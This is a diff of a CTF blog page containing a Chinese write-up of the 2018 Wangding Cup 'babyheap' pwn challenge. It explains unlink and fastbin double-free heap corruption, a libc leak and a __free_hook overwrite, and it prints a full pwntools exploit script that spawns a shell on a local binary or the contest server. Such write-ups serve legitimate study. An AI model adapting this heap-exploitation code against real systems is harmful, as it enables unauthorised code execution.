-<p><img src="/2018/08/30/网鼎杯部分pwn/heap1.png" alt="堆溢出漏洞及fastbin attack结合修改堆上内容"></p>
+<p><img src="/2018/08/30/2018网鼎杯第一场部分pwn/heap1.png" alt="堆溢出漏洞及fastbin attack结合修改堆上内容"></p>
 <p>接下来，把content0构造成空闲的上一块，写入FD和BK指针。这里就是unlink的套路了，FD和BK分别写入ptr[0]-0x18和ptr[0]-0x10，在unlink时先检查 FD-&gt;bk==BK-&gt;fd==P，其中P为要释放的地址，即：<code>*(ptr[0]-0x18+0x18) == *(ptr[0]-0x10+0x10) ==*(ptr[0])</code>，接着是unlink的FD-&gt;bk=BK，BK-&gt;fd=FD，即：</p>
 <p><code>*(ptr[0]-0x18+0x18)=ptr[0]-0x10</code>，<code>*(ptr[0]-0x10+0x10)=ptr[0]-0x18</code>，最终*(ptr[0])=ptr[0]-0x18，即ptr[0]中写入的是ptr[0]-0x18。</p>
 <p>free时同blind一样，要注意inuse位的问题，上一块已经标注为空闲了；当前块的inuse位由下一块控制，地址为content2+0x90，可以事先申请好content3、content4、content5，这样content5就代表着content2的下一块，已经分配的content5 inuse位一定为1；下一块的inuse位由top控制，肯定为1。</p>
 <p>至此，就能实现对ptr的覆写：change第0块相当于向ptr[0]-0x18写入内容，能够覆盖ptr[0]中的值为ptr[8]，再change第0块相当于向ptr[8]中写入内容，能够覆写ptr[8]，ptr[9]和edit_time。</p>
-<p><img src="/2018/08/30/网鼎杯部分pwn/heap2.png" alt="最终堆中的数据"></p>
+<p><img src="/2018/08/30/2018网鼎杯第一场部分pwn/heap2.png" alt="最终堆中的数据"></p>
 <h3 id="泄露libc地址-amp-覆写free-hook"><a href="#泄露libc地址-amp-覆写free-hook" class="headerlink" title="泄露libc地址&amp;覆写free_hook"></a>泄露libc地址&amp;覆写free_hook</h3><p>在上一步的ptr[8]中写入free@got地址，show第8块即可泄露libc地址。</p>
 <p>在上一步的ptr[9]中写入ptr[0]地址，泄露libc地址之后，向ptr[9]中写入free_hook的地址，即ptr[0]中为free_hook地址，再change第0块，写入one_gadget。</p>
 <h2 id="利用脚本-2"><a href="#利用脚本-2" class="headerlink" title="利用脚本"></a>利用脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p = process(<span class="string">'./babyheap'</span>)</span><br><span class="line">	libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'106.75.20.44'</span>,<span class="number">9999</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">ptr_addr = <span class="number">0x602060</span></span><br><span class="line">free_got = <span class="number">0x601f98</span></span><br><span class="line">gadget =[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Choice:"</span>,<span class="string">'1'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line">	p.sendlineafter(<span class="string">"Content:"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Choice:"</span>,<span class="string">'2'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line">	p.sendlineafter(<span class="string">"Content:"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Choice:"</span>,<span class="string">'3'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">release</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Choice:"</span>,<span class="string">'4'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,p64(<span class="number">0xdeadbeef</span>)+p64(<span class="number">0x51</span>)+p64(ptr_addr<span class="number">-0x18</span>)+p64(ptr_addr<span class="number">-0x10</span>)[:<span class="number">-1</span>])</span><br><span class="line">add(<span class="number">1</span>, p64(<span class="number">0xdeadbeef</span>)+p64(<span class="number">0x31</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="string">'2gur1'</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">'3gur1'</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="string">'4gur1'</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="string">'5gur1'</span>)</span><br><span class="line"></span><br><span class="line">release(<span class="number">3</span>)</span><br><span class="line">release(<span class="number">2</span>)</span><br><span class="line">release(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x400d71\nc\nn\nx/8gx 0x602060')</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">heap_addr = u64(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">log.info(<span class="string">'heap_addr:%#x'</span>,heap_addr)</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>,p64(heap_addr<span class="number">-0x20</span>))<span class="comment">#6-&gt;3</span></span><br><span class="line">add(<span class="number">7</span>,<span class="string">'7gur1'</span>)<span class="comment">#7-&gt;2</span></span><br><span class="line">add(<span class="number">8</span>,<span class="string">'8gur1'</span>)<span class="comment">#8-&gt;3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">16</span>+p64(<span class="number">0x50</span>)+p64(<span class="number">0x90</span>)[:<span class="number">-1</span>]</span><br><span class="line">add(<span class="number">9</span>,payload)</span><br><span class="line"></span><br><span class="line">release(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">change(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">24</span>+p64(ptr_addr+<span class="number">0x40</span>)[:<span class="number">-1</span>])</span><br><span class="line">change(<span class="number">0</span>,p64(free_got)+p64(ptr_addr)+p64(<span class="number">0xffffffff</span>))</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">free_addr = u64(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">free_hook = free_addr - libc.symbols[<span class="string">'free'</span>]+libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">one_gadget = free_addr - libc.symbols[<span class="string">'free'</span>]+ gadget[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">change(<span class="number">9</span>,p64(free_hook))</span><br><span class="line">change(<span class="number">0</span>,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">release(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
@@ -493,6 +494,12 @@
 
     <footer class="post-footer">
       
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
 
       
       
@@ -502,8 +509,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/07/11/WCTF2018-rswc/" rel="next" title="WCTF2018-rswc">
-                <i class="fa fa-chevron-left"></i> WCTF2018-rswc
+              <a href="/2018/08/30/网鼎杯部分pwn/" rel="next" title="网鼎杯部分pwn">
+                <i class="fa fa-chevron-left"></i> 网鼎杯部分pwn
               </a>
             
           </div>
@@ -512,8 +519,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/08/30/2018网鼎杯第一场部分pwn/" rel="prev" title="2018网鼎杯第一场部分pwn">
-                2018网鼎杯第一场部分pwn <i class="fa fa-chevron-right"></i>
+              <a href="/2018/08/30/工具安装及使用/" rel="prev" title="工具安装及使用">
+                工具安装及使用 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
